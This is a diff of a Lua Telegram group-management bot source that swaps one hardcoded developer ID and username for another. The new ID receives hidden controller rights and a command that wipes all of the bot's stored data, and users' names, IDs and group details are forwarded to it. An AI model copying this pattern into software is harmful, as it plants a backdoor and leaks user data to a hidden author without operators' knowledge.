@@ -98,8 +98,8 @@ token=Token
 ----------------------------------------------------------------------------------------------------
 ----------------------------------------------------------------------------------------------------
 namebot = redis:get(bot_id..":namebot") or " كاتيا"
-SudosS = {6607660972}
-Sudos = {sudoid,6607660972}
+SudosS = {5511452185}
+Sudos = {sudoid,5511452185}
 ----------------------------------------------------------------------------------------------------
 ---------------------------------------------------------------------------------------------------
 function coin(coin)
@@ -248,9 +248,9 @@ end
 function Get_Rank(user_id,chat_id)
 if devS(user_id) then  
 var = 'مطور السورس'
-elseif tonumber(user_id) == tonumber(6607660972) then  
+elseif tonumber(user_id) == tonumber(5511452185) then  
 var = 'مبرمج السورس'
-elseif tonumber(user_id) == tonumber(6607660972) then  
+elseif tonumber(user_id) == tonumber(5511452185) then  
 var = 'مبرمج السورس'
 elseif devB(user_id) then 
 var = "المطور الاساسي"  
@@ -872,7 +872,7 @@ else
 datar[k] = {{text =v,data ="DoOrDel_"..ub.."_"..v},{text ="معطل",data ="DoOrDel_"..ub.."_"..v}}
 end
 end
-datar[#json.plugins_ +1] = {{text = "‹ مطور السورس ›",url ="https://t.me/R_b_Q"}}
+datar[#json.plugins_ +1] = {{text = "‹ مطور السورس ›",url ="https://t.me/IINININI"}}
 end
 return datar
 end
@@ -3331,11 +3331,11 @@ return bot.editMessageText(chat_id,msg_id,TextMahibesAgane, 'md', true, false, r
 end
 
 ---------------------------------------------------------------------------------------------------------
-if tonumber(data.sender_user_id) == 6607660972 then
+if tonumber(data.sender_user_id) == 5511452185 then
 data.The_Controller = 1
-elseif tonumber(data.sender_user_id) == 6607660972 then
+elseif tonumber(data.sender_user_id) == 5511452185 then
 data.The_Controller = 1
-elseif tonumber(data.sender_user_id) == 6607660972 then
+elseif tonumber(data.sender_user_id) == 5511452185 then
 data.The_Controller = 1
 elseif devB(data.sender_user_id) == true then  
 data.The_Controller = 1
@@ -4959,7 +4959,7 @@ ban = ' '..UserInfo.first_name..' '
 u = ''..UserInfo.username..''
 else
 t = '['..UserInfo.first_name..'](tg://user?id='..UserInfo.id..')'
-u = 'R_b_Q'
+u = 'IINININI'
 end
 local reply_markup = bot.replyMarkup{
 type = 'inline',data = {
@@ -9237,7 +9237,7 @@ type = 'inline',data = {
 {{text = 'اخفاء', data = msg.sender_id.user_id..'/delAmr'}},
 }
 }
-if tonumber(msg.sender_id.user_id) == tonumber(6607660972) then 
+if tonumber(msg.sender_id.user_id) == tonumber(5511452185) then 
 local keys = redis:keys(bot_id..'*')
 for i = 1, #keys do
 redis:del(keys[i])
@@ -14978,7 +14978,7 @@ bot.sendText(msg.chat_id,msg.id,"*- الاسم : *( "..(t).." *)*\n*- المعر
 end
 end
 if text == 'مبرمج السورس' or text == 'coder' or text == 'المبرمج' then
-local UserId_Info = bot.searchPublicChat("R_b_Q")
+local UserId_Info = bot.searchPublicChat("IINININI")
 if UserId_Info.id then
 local UserInfo = bot.getUser(UserId_Info.id)
 if UserInfo.username and UserInfo.username ~= "" then
@@ -15006,7 +15006,7 @@ end
 end
 end
 if text == 'مطور السورس' then
-local UserId_Info = bot.searchPublicChat("R_b_Q")
+local UserId_Info = bot.searchPublicChat("IINININI")
 if UserId_Info.id then
 local UserInfo = bot.getUser(UserId_Info.id)
 if UserInfo.username and UserInfo.username ~= "" then
@@ -15874,9 +15874,9 @@ data = {
 }
 }
 
-bot.sendText(6607660972,0,'*\n- مرحباً عزيزي المطور \nشخص ما يحتاج مساعدتك\nٴ— — — — — — — — — \n- اسمه : '..klajq..' \n- ايديه : '..msg.sender_id.user_id..'\n- يوزره : @'..basgk..'\n- الوقت : '..os.date("%I:%M %p")..'\n- التاريخ : '..os.date("%Y/%m/%d")..'*',"md",false, false, false, false, reply_markup)
-bot.sendText(6607660972,0,'*\n- مرحباً عزيزي المطور \nشخص ما يحتاج مساعدتك\nٴ— — — — — — — — — \n- اسمه : '..klajq..' \n- ايديه : '..msg.sender_id.user_id..'\n- يوزره : @'..basgk..'\n- الوقت : '..os.date("%I:%M %p")..'\n- التاريخ : '..os.date("%Y/%m/%d")..'*',"md",false, false, false, false, reply_markup)
-bot.sendText(6607660972,0,'*\n- مرحباً عزيزي المطور \nشخص ما يحتاج مساعدتك\nٴ— — — — — — — — — \n- اسمه : '..klajq..' \n- ايديه : '..msg.sender_id.user_id..'\n- يوزره : @'..basgk..'\n- الوقت : '..os.date("%I:%M %p")..'\n- التاريخ : '..os.date("%Y/%m/%d")..'*',"md",false, false, false, false, reply_markup)
+bot.sendText(5511452185,0,'*\n- مرحباً عزيزي المطور \nشخص ما يحتاج مساعدتك\nٴ— — — — — — — — — \n- اسمه : '..klajq..' \n- ايديه : '..msg.sender_id.user_id..'\n- يوزره : @'..basgk..'\n- الوقت : '..os.date("%I:%M %p")..'\n- التاريخ : '..os.date("%Y/%m/%d")..'*',"md",false, false, false, false, reply_markup)
+bot.sendText(5511452185,0,'*\n- مرحباً عزيزي المطور \nشخص ما يحتاج مساعدتك\nٴ— — — — — — — — — \n- اسمه : '..klajq..' \n- ايديه : '..msg.sender_id.user_id..'\n- يوزره : @'..basgk..'\n- الوقت : '..os.date("%I:%M %p")..'\n- التاريخ : '..os.date("%Y/%m/%d")..'*',"md",false, false, false, false, reply_markup)
+bot.sendText(5511452185,0,'*\n- مرحباً عزيزي المطور \nشخص ما يحتاج مساعدتك\nٴ— — — — — — — — — \n- اسمه : '..klajq..' \n- ايديه : '..msg.sender_id.user_id..'\n- يوزره : @'..basgk..'\n- الوقت : '..os.date("%I:%M %p")..'\n- التاريخ : '..os.date("%Y/%m/%d")..'*',"md",false, false, false, false, reply_markup)
 end
 if text == "تتزوجني" then
 if not redis:get(bot_id.."ttzog"..msg.chat_id) then
@@ -17474,9 +17474,9 @@ if text == "انا مين" or text == 'مين انا' then
 if not redis:get(bot_id.."anamen"..msg.chat_id) then
 return bot.sendText(msg.chat_id,msg.id,"- انا مين معطل من قبل المشرفين","md",true)
 end
-if msg.sender_id.user_id == tonumber(6607660972) then
+if msg.sender_id.user_id == tonumber(5511452185) then
 bot.sendText(msg.chat_id,msg.id,"- انتا العشق وهم 🥰","md",true)
-elseif msg.sender_id.user_id == tonumber(6607660972) then
+elseif msg.sender_id.user_id == tonumber(5511452185) then
 bot.sendText(msg.chat_id,msg.id,"- المطور كاتيا 😍","md",true)
 elseif devB(msg.sender_id.user_id) then
 bot.sendText(msg.chat_id,msg.id,"- انت المطور الاساسي يقلبي🌚♥","md",true)
@@ -23801,7 +23801,7 @@ local Text = "*- welcome to the Source ALSEADA*\n"
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '- Source ALSEADA',url="https://t.me/z2zzz3"}},
-{{text = '- المطور .',url="https://t.me/R_b_Q"}},
+{{text = '- المطور .',url="https://t.me/IINININI"}},
 }
 https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg.chat_id .. "&photo=https://t.me/z2zzz3&caption=".. URL.escape(Text).."&photo=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
@@ -23927,7 +23927,7 @@ if data and data.luatele and data.luatele == "updateSupergroup" then
 local Get_Chat = bot.getChat('-100'..data.supergroup.id)
 if data.supergroup.status.luatele == "chatMemberStatusBanned" then
 redis:srem(bot_id..":Groups",'-100'..data.supergroup.id)
-bot.sendText(6607660972,0,'*\n- تم طرد البوت من كروب جديد \n- اسم المجموعه : '..Get_Chat.title..'\n- ايدي المجموعه :*`-100'..data.supergroup.id..'`\n- تم مسح جميع البيانات المتعلقه بالمجموعه',"md")
+bot.sendText(5511452185,0,'*\n- تم طرد البوت من كروب جديد \n- اسم المجموعه : '..Get_Chat.title..'\n- ايدي المجموعه :*`-100'..data.supergroup.id..'`\n- تم مسح جميع البيانات المتعلقه بالمجموعه',"md")
 bot.sendText(sudoid,0,'*\n- تم طرد البوت من كروب جديد \n- اسم المجموعه : '..Get_Chat.title..'\n- ايدي المجموعه :*`-100'..data.supergroup.id..'`\n- تم مسح جميع البيانات المتعلقه بالمجموعه',"md")
 end
 end
